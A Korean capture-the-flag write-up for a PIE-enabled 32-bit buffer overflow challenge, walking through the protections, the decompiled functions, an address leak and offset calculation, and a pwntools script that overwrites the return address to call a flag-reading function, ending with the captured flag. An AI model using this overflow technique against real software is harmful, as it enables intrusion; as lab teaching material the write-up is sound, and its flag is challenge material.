풀이

gdb -q bof_pie 

를 입력하고 확인한다.

CANARY : disabled
FORTIFY : disabled
NX : ENABLED
PIE : ENABLED
RELRO : Partial


NX 의 경우 heap, stack , data 영역의 실행권한이 없다.
PIE 의 경우 코드영역을 포함한 모든영역이 랜덤하게 매핑된다.
(그러나 PIE는 Base 주소만 달라지기 때문에 offset을 이용하면 해결가능)
일단은

1. 쉘코드 사용불가

2. 실행하고자하는 함수가있으면 리턴주소로 가리켜야함

3. 부분적으로 보호가 걸려있어서 got 기법이 가능한지여부는 
불확실

따라서

CANARY 와 FORTIFY 가 안걸려있으므로

충분히 RET 주소 변조로 BOF 를 일으킬수 있다.

offset문제와 유사한 문제이다.


이제 풀이에 들어가보자

#먼저 ./bof_pie 를 했을떄 welcome 의 주소가 뜨는데
계속해서 바뀐다.



main() 함수

nt __cdecl main(int argc, const char **argv, const char **envp)
{
  welcome();
  puts("Nah...");
  return 0;
}

보면 welcome() 함수를 실행 즉 welcome() 함수 내부에서 무언가를 
하라는거 같으므로 welcome() 함수를 찾아보자.

welcome() 함수


int welcome()
{
  char v1; // [esp+6h] [ebp-12h]

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("Hello, Do you know j0n9hyun?");
  printf("j0n9hyun is %p\n", welcome);
  return _isoc99_scanf("%s", &v1);
}

welcome() 함수를 보면 

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

v1이 6 + 12 = 18 거리는 18바이트 그리고 이문제는 쉘코드삽입이나

ret주소 를 변형해서 하는문제가 아닌

offset 주소를 계산해서 위치만 바꾸어지는 식의 문제이므로

ret 주소까지 총 22 버퍼

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

printf("j0n9hyun is %p\n", welcome); 에 welcome 의 주소를 출력한다.
다만 주소가 계속 바뀌는듯 하다.

return _isoc99_scanf("%s", &v1);    vi을 문자열에 저장한다.

결론은 welcome함수에서 _isoc99_scanf 함수를 실행하므로. 우리는 이 함수가아닌
우리가 원하는 함수로 ret 주소를 바꿀 필요가 있다.

일단 다른 함수들도 살펴보면 

void j0n9hyun()
{
  char s; // [esp+4h] [ebp-34h]
  FILE *stream; // [esp+2Ch] [ebp-Ch]

  puts("ha-wi");
  stream = fopen("flag", "r");
  if ( stream )
  {
    fgets(&s, 40, stream);
    fclose(stream);
    puts(&s);
  }
  else
  {
    perror("flag");
  }
}
이런 함수가 있는데 이게 딱 flag 함수이다. 우리는 저 return 의 실행되는 함수
주소에서 이 j0n9hyun() 주소로 바꿔주면 된다.

( welcome 함수는 유동적으로 바뀜 따라서 leak 를 해줘야함 )

주소의길이가 10이므로 recv(10) 으로 leak

그리고 페이로드를 작성하면된다.

제일 중요한 

welcome()와 j0n9hyun() 주소를 알아보자.

welcome()   >>   0000 0909	오프셋

j0n9hyun()  >>  0000 0890	오프셋

위의 갚이 offset 값인데 이둘의 거리값을 알기위해 뺴면 0x79 가나오는데

welcome offset 에서 둘의 차 만큼 뺴면 그것이 j0n9hyun 주소이다.

즉 ( 웰컴이라는 큰주소에서 j0n9hyun 빼면 현재 웰컴의 주소만 남은것이고

우리가 필요한건 j0n9hyun 주소이기떄문에 우리가구한 웰컴 주소에서

총 웰컴 주소 - 웰컴주소 하면 그것이 j0n9hyun 주소이다. )


따라서

내풀이(시험작)

from pwn import *

p = remote("ctf.j0n9hyun.xyz",3008)

p.recvuntil("Hello, Do you know j0n9hyun?")
p.recvuntil("j0n9hyun is ")
w_add = int(p.recv(10)[0:],16)
j_add = w_add - 0x79

pay = "A" * 22 + p32(j_add)

p.sendline(pay)
p.interactive()


입력해서 python 으로 컴파일하면

HackCTF{243699563792879976364976468837}

플래그가나온다.
